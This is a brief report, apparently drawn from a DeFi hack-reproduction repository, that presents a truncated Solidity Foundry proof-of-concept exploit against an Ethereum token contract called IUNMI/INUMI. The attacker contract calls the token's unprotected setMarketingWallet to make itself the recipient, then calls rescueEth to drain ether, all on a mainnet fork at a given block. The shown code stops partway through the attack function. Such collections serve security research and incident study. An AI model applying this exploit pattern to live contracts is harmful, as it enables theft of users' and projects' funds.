# [?] IUNMI_db27 exploit (IUNMI_db27_exp.sol)

## Summary
Severity: Unknown
Chain: Ethereum
Component: IUNMI_db27
Published: IUNMI_db27_exp.sol
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/IUNMI_db27_exp.sol
Type: defi-exploit-poc

## Details
```solidity
contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 20729672-1);
        deal(attacker, 1.07297e-13 ether);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", address(attacker).balance, 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        deal(address(attC), 2.0000000000001075 ether);
        attC.attack{value: 1.07297e-13 ether}();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", address(attacker).balance, 18);
    }
}

// 0x5B5A0580bcfd3673820Bb249514234aFAD33e209
contract AttackerC {
    function attack() public payable {
        // call_1: INUMI_contract.setMarketingWallet(addr1)
        (bool s1, ) = INUMI_contract.call(abi.encodeWithSelector(bytes4(keccak256("setMarketingWallet(address)")), address(this)));
        require(s1, "setMarketingWallet fail");

        // call_2: INUMI_contract.rescueEth()
        (bool s2, ) = INUMI_contract.call(abi.encodeWithSelector(bytes4(keccak256("rescueEth()"))));
        require(s2, "rescueEth fail");

        // static call_3: WETH.balanceOf(address(this))
        uint256 bal = IWETH9(weth9).balanceOf(address(this));

        if (bal == 0) {
            // Replicate the gasprice-based payout logic
            unchecked {
                uint256 gp = tx.gasprice;
                if (((43900 * gp) / (gp == 0 ? 1 : gp) == 43900) || gp == 0) {
                    if (2 ether > (43900 * gp)) {
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/IUNMI_db27_exp.sol_
